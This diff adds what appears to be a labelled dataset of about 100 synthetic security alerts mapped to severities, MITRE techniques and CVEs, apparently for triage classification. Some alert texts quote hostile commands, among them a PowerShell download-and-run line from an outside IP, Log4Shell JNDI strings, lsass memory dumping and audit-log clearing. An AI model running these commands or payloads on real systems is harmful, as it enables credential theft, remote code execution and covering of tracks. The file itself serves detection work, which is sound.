@@ -1,0 +1,102 @@
+{"id": "A102", "text": "Authorised vulnerability scan (ticket CHG-2231) from scanner 10.0.11.84 against SRV-WEB02 completed", "severity": "low", "technique_id": "none", "cves": []}
+{"id": "A039", "text": "Periodic HTTPS beaconing every 60s from WS-0142 to 203.40.70.73 with identical 312-byte payloads", "severity": "high", "technique_id": "T1071.001", "cves": []}
+{"id": "A023", "text": "procdump.exe -ma lsass.exe executed on WS-0142 by tlee", "severity": "critical", "technique_id": "T1003.001", "cves": []}
+{"id": "A065", "text": "EventID 4624 logon type 10 (RemoteInteractive) on SRV-WEB02 for asharma from external 185.85.139.120 at 02:47", "severity": "medium", "technique_id": "T1021.001", "cves": []}
+{"id": "A091", "text": "Scheduled backup job completed on WS-0142 in 210 minutes with no errors", "severity": "low", "technique_id": "none", "cves": []}
+{"id": "A002", "text": "49 failed SSH logins for user rnair from 45.8.24.56 within 60 seconds on SRV-WEB02", "severity": "medium", "technique_id": "T1110", "cves": []}
+{"id": "A003", "text": "106 failed SSH logins for user tlee from 203.108.57.115 within 60 seconds on DC01", "severity": "medium", "technique_id": "T1110", "cves": []}
+{"id": "A101", "text": "Authorised vulnerability scan (ticket CHG-2231) from scanner 10.0.15.236 against WS-0142 completed", "severity": "low", "technique_id": "none", "cves": []}
+{"id": "A074", "text": "Windows Defender real-time protection disabled via registry on WS-0317 by tlee", "severity": "high", "technique_id": "T1562.001", "cves": []}
+{"id": "A029", "text": "EDR: SRV-DB01 rapidly encrypting documents (12 files/min), extension changed to .crypt, ransom note dropped", "severity": "critical", "technique_id": "T1486", "cves": []}
+{"id": "A044", "text": "188 MB uploaded from DC01 to unknown FTP server 91.171.27.91 at 02:14, outside business hours", "severity": "high", "technique_id": "T1048", "cves": []}
+{"id": "A072", "text": "wevtutil cl Security executed on WS-0142 by rnair shortly after privilege escalation", "severity": "high", "technique_id": "T1070.001", "cves": []}
+{"id": "A056", "text": "IDS: SMBv1 exploit attempt (MS17-010) from 185.173.55.131 against SRV-WEB02 port 445", "severity": "critical", "technique_id": "T1190", "cves": ["CVE-2017-0144"]}
+{"id": "A051", "text": "WAF: JNDI lookup string ${jndi:ldap://91.66.12.182/x} in User-Agent from 91.66.12.182 targeting /api/login on LT-0098", "severity": "critical", "technique_id": "T1190", "cves": ["CVE-2021-44228"]}
+{"id": "A024", "text": "procdump.exe -ma lsass.exe executed on SRV-WEB02 by tlee", "severity": "critical", "technique_id": "T1003.001", "cves": []}
+{"id": "A055", "text": "IDS: SMBv1 exploit attempt (MS17-010) from 45.78.74.54 against LT-0098 port 445", "severity": "critical", "technique_id": "T1190", "cves": ["CVE-2017-0144"]}
+{"id": "A048", "text": "DLP: svc_backup on WS-0317 sent 103 MB to external FTP 103.222.18.248; destination not in allow-list", "severity": "high", "technique_id": "T1048", "cves": []}
+{"id": "A040", "text": "Proxy logs: WS-0317 contacts newly registered domain secure-billing.xyz every 5 min with uniform request sizes (beacon pattern)", "severity": "high", "technique_id": "T1071.001", "cves": []}
+{"id": "A061", "text": "RDP login to LT-0098 from 203.153.82.244 by tlee at 03:12, first time this source IP is seen", "severity": "medium", "technique_id": "T1021.001", "cves": []}
+{"id": "A077", "text": "EDR sensor service stopped on WS-0142 by admin01; tamper protection event", "severity": "high", "technique_id": "T1562.001", "cves": []}
+{"id": "A022", "text": "procdump.exe -ma lsass.exe executed on WS-0142 by mkumar", "severity": "critical", "technique_id": "T1003.001", "cves": []}
+{"id": "A069", "text": "EventID 1102: Security audit log cleared on LT-0098 by mkumar", "severity": "high", "technique_id": "T1070.001", "cves": []}
+{"id": "A092", "text": "Scheduled backup job completed on LT-0098 in 132 minutes with no errors", "severity": "low", "technique_id": "none", "cves": []}
+{"id": "A090", "text": "VPN: jdoe authenticated from Brazil then from India within 15 minutes", "severity": "medium", "technique_id": "T1078", "cves": []}
+{"id": "A083", "text": "schtasks /create /tn Sync /tr C:\\ProgramData\\s.exe /sc minute /mo 5 executed on WS-0142 by mkumar", "severity": "medium", "technique_id": "T1053.005", "cves": []}
+{"id": "A062", "text": "RDP login to LT-0098 from 185.230.41.191 by svc_backup at 03:12, first time this source IP is seen", "severity": "medium", "technique_id": "T1021.001", "cves": []}
+{"id": "A014", "text": "Email from billing@cdn-update.top with attachment invoice_326.docm delivered to mkumar@corp.example; macro detected by gateway", "severity": "medium", "technique_id": "T1566.001", "cves": []}
+{"id": "A028", "text": "EDR: WS-0142 rapidly encrypting documents (241 files/min), extension changed to .crypt, ransom note dropped", "severity": "critical", "technique_id": "T1486", "cves": []}
+{"id": "A026", "text": "Mass file rename to .locked: 244 files modified in 30 seconds on DC01; ransom note README_DECRYPT.txt created", "severity": "critical", "technique_id": "T1486", "cves": []}
+{"id": "A038", "text": "Periodic HTTPS beaconing every 60s from DC01 to 203.3.171.210 with identical 312-byte payloads", "severity": "high", "technique_id": "T1071.001", "cves": []}
+{"id": "A034", "text": "IDS: sequential SYN probes from 10.0.22.151 to 131 hosts on ports 22,80,445,3389", "severity": "low", "technique_id": "T1046", "cves": []}
+{"id": "A093", "text": "Scheduled backup job completed on LT-0098 in 231 minutes with no errors", "severity": "low", "technique_id": "none", "cves": []}
+{"id": "A009", "text": "powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA= spawned by winword.exe on SRV-DB01, user tlee", "severity": "high", "technique_id": "T1059.001", "cves": []}
+{"id": "A045", "text": "84 MB uploaded from SRV-DB01 to unknown FTP server 91.226.106.7 at 02:14, outside business hours", "severity": "high", "technique_id": "T1048", "cves": []}
+{"id": "A013", "text": "Email from billing@secure-billing.xyz with attachment invoice_303.docm delivered to svc_backup@corp.example; macro detected by gateway", "severity": "medium", "technique_id": "T1566.001", "cves": []}
+{"id": "A079", "text": "New scheduled task 'Updater' created on DC01 by mkumar running C:\\Users\\Public\\upd.exe", "severity": "medium", "technique_id": "T1053.005", "cves": []}
+{"id": "A049", "text": "WAF: JNDI lookup string ${jndi:ldap://103.241.8.30/x} in User-Agent from 103.241.8.30 targeting /api/login on LT-0098", "severity": "critical", "technique_id": "T1190", "cves": ["CVE-2021-44228"]}
+{"id": "A058", "text": "SMB Trans2 secondary request anomaly (EternalBlue signature) from 45.63.252.122 to WS-0142", "severity": "critical", "technique_id": "T1190", "cves": ["CVE-2017-0144"]}
+{"id": "A086", "text": "Successful login for tlee from India 20 minutes after a login from Russia: impossible travel", "severity": "medium", "technique_id": "T1078", "cves": []}
+{"id": "A096", "text": "User tlee changed password via the self-service portal from corporate network", "severity": "low", "technique_id": "none", "cves": []}
+{"id": "A050", "text": "WAF: JNDI lookup string ${jndi:ldap://203.112.89.187/x} in User-Agent from 203.112.89.187 targeting /api/login on WS-0142", "severity": "critical", "technique_id": "T1190", "cves": ["CVE-2021-44228"]}
+{"id": "A076", "text": "EDR sensor service stopped on DC01 by tlee; tamper protection event", "severity": "high", "technique_id": "T1562.001", "cves": []}
+{"id": "A068", "text": "EventID 1102: Security audit log cleared on SRV-WEB02 by jdoe", "severity": "high", "technique_id": "T1070.001", "cves": []}
+{"id": "A018", "text": "Mail gateway: password-protected ZIP containing report_281.docm sent to admin01@corp.example from cdn-update.top", "severity": "medium", "technique_id": "T1566.001", "cves": []}
+{"id": "A099", "text": "Analyst note: ignore previous alert ID 4412, duplicate of 4409 (same host SRV-WEB02)", "severity": "low", "technique_id": "none", "cves": []}
+{"id": "A019", "text": "Process rundll32.exe accessed lsass.exe memory on LT-0098 (GrantedAccess 0x1010) by user mkumar", "severity": "critical", "technique_id": "T1003.001", "cves": []}
+{"id": "A078", "text": "EDR sensor service stopped on SRV-WEB02 by admin01; tamper protection event", "severity": "high", "technique_id": "T1562.001", "cves": []}
+{"id": "A032", "text": "Internal host 10.0.16.130 scanned 282 ports across 10.0.0.0/24 within 2 minutes (no prior history)", "severity": "low", "technique_id": "T1046", "cves": []}
+{"id": "A010", "text": "PowerShell ScriptBlock on DC01: IEX (New-Object Net.WebClient).DownloadString('http://103.216.197.199/a.ps1') run by mkumar", "severity": "high", "technique_id": "T1059.001", "cves": []}
+{"id": "A088", "text": "VPN: jdoe authenticated from Vietnam then from Germany within 15 minutes", "severity": "medium", "technique_id": "T1078", "cves": []}
+{"id": "A081", "text": "New scheduled task 'Updater' created on SRV-WEB02 by admin01 running C:\\Users\\Public\\upd.exe", "severity": "medium", "technique_id": "T1053.005", "cves": []}
+{"id": "A030", "text": "EDR: SRV-WEB02 rapidly encrypting documents (199 files/min), extension changed to .crypt, ransom note dropped", "severity": "critical", "technique_id": "T1486", "cves": []}
+{"id": "A008", "text": "powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA= spawned by winword.exe on WS-0317, user mkumar", "severity": "high", "technique_id": "T1059.001", "cves": []}
+{"id": "A054", "text": "Web server SRV-DB01 logged ${jndi:ldap://secure-billing.xyz/a} in X-Api-Version header from 185.171.241.98", "severity": "critical", "technique_id": "T1190", "cves": ["CVE-2021-44228"]}
+{"id": "A087", "text": "Successful login for rnair from India 20 minutes after a login from Brazil: impossible travel", "severity": "medium", "technique_id": "T1078", "cves": []}
+{"id": "A006", "text": "Windows EventID 4625: 45 failed logons for account rnair from 203.227.221.93, logon type 3, host WS-0317", "severity": "medium", "technique_id": "T1110", "cves": []}
+{"id": "A073", "text": "Windows Defender real-time protection disabled via registry on WS-0142 by mkumar", "severity": "high", "technique_id": "T1562.001", "cves": []}
+{"id": "A082", "text": "schtasks /create /tn Sync /tr C:\\ProgramData\\s.exe /sc minute /mo 5 executed on WS-0317 by mkumar", "severity": "medium", "technique_id": "T1053.005", "cves": []}
+{"id": "A084", "text": "schtasks /create /tn Sync /tr C:\\ProgramData\\s.exe /sc minute /mo 5 executed on SRV-WEB02 by tlee", "severity": "medium", "technique_id": "T1053.005", "cves": []}
+{"id": "A036", "text": "IDS: sequential SYN probes from 10.0.4.20 to 166 hosts on ports 22,80,445,3389", "severity": "low", "technique_id": "T1046", "cves": []}
+{"id": "A020", "text": "Process taskmgr.exe accessed lsass.exe memory on LT-0098 (GrantedAccess 0x1010) by user svc_backup", "severity": "critical", "technique_id": "T1003.001", "cves": []}
+{"id": "A011", "text": "PowerShell ScriptBlock on SRV-DB01: IEX (New-Object Net.WebClient).DownloadString('http://203.225.184.81/a.ps1') run by asharma", "severity": "high", "technique_id": "T1059.001", "cves": []}
+{"id": "A046", "text": "DLP: admin01 on SRV-DB01 sent 381 MB to external FTP 103.41.202.180; destination not in allow-list", "severity": "high", "technique_id": "T1048", "cves": []}
+{"id": "A031", "text": "Internal host 10.0.7.249 scanned 289 ports across 10.0.0.0/24 within 2 minutes (no prior history)", "severity": "low", "technique_id": "T1046", "cves": []}
+{"id": "A004", "text": "Windows EventID 4625: 221 failed logons for account jdoe from 91.56.246.196, logon type 3, host WS-0317", "severity": "medium", "technique_id": "T1110", "cves": []}
+{"id": "A016", "text": "Mail gateway: password-protected ZIP containing report_155.docm sent to svc_backup@corp.example from cdn-update.top", "severity": "medium", "technique_id": "T1566.001", "cves": []}
+{"id": "A063", "text": "RDP login to LT-0098 from 185.161.62.71 by jdoe at 03:12, first time this source IP is seen", "severity": "medium", "technique_id": "T1021.001", "cves": []}
+{"id": "A075", "text": "Windows Defender real-time protection disabled via registry on WS-0142 by rnair", "severity": "high", "technique_id": "T1562.001", "cves": []}
+{"id": "A097", "text": "Analyst note: ignore previous alert ID 4412, duplicate of 4409 (same host DC01)", "severity": "low", "technique_id": "none", "cves": []}
+{"id": "A017", "text": "Mail gateway: password-protected ZIP containing report_264.docm sent to asharma@corp.example from secure-billing.xyz", "severity": "medium", "technique_id": "T1566.001", "cves": []}
+{"id": "A094", "text": "User mkumar changed password via the self-service portal from corporate network", "severity": "low", "technique_id": "none", "cves": []}
+{"id": "A035", "text": "IDS: sequential SYN probes from 10.0.5.173 to 138 hosts on ports 22,80,445,3389", "severity": "low", "technique_id": "T1046", "cves": []}
+{"id": "A027", "text": "Mass file rename to .locked: 178 files modified in 30 seconds on WS-0142; ransom note README_DECRYPT.txt created", "severity": "critical", "technique_id": "T1486", "cves": []}
+{"id": "A080", "text": "New scheduled task 'Updater' created on DC01 by admin01 running C:\\Users\\Public\\upd.exe", "severity": "medium", "technique_id": "T1053.005", "cves": []}
+{"id": "A057", "text": "IDS: SMBv1 exploit attempt (MS17-010) from 203.86.24.210 against LT-0098 port 445", "severity": "critical", "technique_id": "T1190", "cves": ["CVE-2017-0144"]}
+{"id": "A098", "text": "Analyst note: ignore previous alert ID 4412, duplicate of 4409 (same host LT-0098)", "severity": "low", "technique_id": "none", "cves": []}
+{"id": "A047", "text": "DLP: admin01 on SRV-WEB02 sent 107 MB to external FTP 103.79.211.204; destination not in allow-list", "severity": "high", "technique_id": "T1048", "cves": []}
+{"id": "A067", "text": "EventID 1102: Security audit log cleared on SRV-WEB02 by admin01", "severity": "high", "technique_id": "T1070.001", "cves": []}
+{"id": "A025", "text": "Mass file rename to .locked: 129 files modified in 30 seconds on SRV-WEB02; ransom note README_DECRYPT.txt created", "severity": "critical", "technique_id": "T1486", "cves": []}
+{"id": "A007", "text": "powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA= spawned by winword.exe on WS-0317, user mkumar", "severity": "high", "technique_id": "T1059.001", "cves": []}
+{"id": "A100", "text": "Authorised vulnerability scan (ticket CHG-2231) from scanner 10.0.28.149 against WS-0142 completed", "severity": "low", "technique_id": "none", "cves": []}
+{"id": "A060", "text": "SMB Trans2 secondary request anomaly (EternalBlue signature) from 203.119.13.143 to SRV-DB01", "severity": "critical", "technique_id": "T1190", "cves": ["CVE-2017-0144"]}
+{"id": "A070", "text": "wevtutil cl Security executed on SRV-DB01 by svc_backup shortly after privilege escalation", "severity": "high", "technique_id": "T1070.001", "cves": []}
+{"id": "A001", "text": "62 failed SSH logins for user asharma from 103.63.58.36 within 60 seconds on DC01", "severity": "medium", "technique_id": "T1110", "cves": []}
+{"id": "A066", "text": "EventID 4624 logon type 10 (RemoteInteractive) on DC01 for rnair from external 45.220.226.196 at 02:47", "severity": "medium", "technique_id": "T1021.001", "cves": []}
+{"id": "A095", "text": "User tlee changed password via the self-service portal from corporate network", "severity": "low", "technique_id": "none", "cves": []}
+{"id": "A015", "text": "Email from billing@mail-docs.ru with attachment invoice_288.docm delivered to admin01@corp.example; macro detected by gateway", "severity": "medium", "technique_id": "T1566.001", "cves": []}
+{"id": "A042", "text": "Proxy logs: DC01 contacts newly registered domain mail-docs.ru every 5 min with uniform request sizes (beacon pattern)", "severity": "high", "technique_id": "T1071.001", "cves": []}
+{"id": "A033", "text": "Internal host 10.0.28.62 scanned 265 ports across 10.0.0.0/24 within 2 minutes (no prior history)", "severity": "low", "technique_id": "T1046", "cves": []}
+{"id": "A041", "text": "Proxy logs: WS-0317 contacts newly registered domain cdn-update.top every 5 min with uniform request sizes (beacon pattern)", "severity": "high", "technique_id": "T1071.001", "cves": []}
+{"id": "A012", "text": "PowerShell ScriptBlock on WS-0317: IEX (New-Object Net.WebClient).DownloadString('http://91.64.191.144/a.ps1') run by mkumar", "severity": "high", "technique_id": "T1059.001", "cves": []}
+{"id": "A059", "text": "SMB Trans2 secondary request anomaly (EternalBlue signature) from 185.127.103.63 to SRV-DB01", "severity": "critical", "technique_id": "T1190", "cves": ["CVE-2017-0144"]}
+{"id": "A005", "text": "Windows EventID 4625: 188 failed logons for account admin01 from 203.68.207.12, logon type 3, host WS-0317", "severity": "medium", "technique_id": "T1110", "cves": []}
+{"id": "A071", "text": "wevtutil cl Security executed on SRV-WEB02 by admin01 shortly after privilege escalation", "severity": "high", "technique_id": "T1070.001", "cves": []}
+{"id": "A052", "text": "Web server DC01 logged ${jndi:ldap://cdn-update.top/a} in X-Api-Version header from 91.94.111.18", "severity": "critical", "technique_id": "T1190", "cves": ["CVE-2021-44228"]}
+{"id": "A085", "text": "Successful login for tlee from India 20 minutes after a login from Brazil: impossible travel", "severity": "medium", "technique_id": "T1078", "cves": []}
+{"id": "A037", "text": "Periodic HTTPS beaconing every 60s from WS-0317 to 45.226.63.95 with identical 312-byte payloads", "severity": "high", "technique_id": "T1071.001", "cves": []}
+{"id": "A064", "text": "EventID 4624 logon type 10 (RemoteInteractive) on WS-0317 for jdoe from external 203.21.36.39 at 02:47", "severity": "medium", "technique_id": "T1021.001", "cves": []}
+{"id": "A089", "text": "VPN: jdoe authenticated from Vietnam then from Germany within 15 minutes", "severity": "medium", "technique_id": "T1078", "cves": []}
+{"id": "A053", "text": "Web server WS-0142 logged ${jndi:ldap://cdn-update.top/a} in X-Api-Version header from 103.130.80.171", "severity": "critical", "technique_id": "T1190", "cves": ["CVE-2021-44228"]}
+{"id": "A043", "text": "23 MB uploaded from WS-0317 to unknown FTP server 203.142.38.111 at 02:14, outside business hours", "severity": "high", "technique_id": "T1048", "cves": []}
+{"id": "A021", "text": "Process procdump.exe accessed lsass.exe memory on DC01 (GrantedAccess 0x1010) by user mkumar", "severity": "critical", "technique_id": "T1003.001", "cves": []}
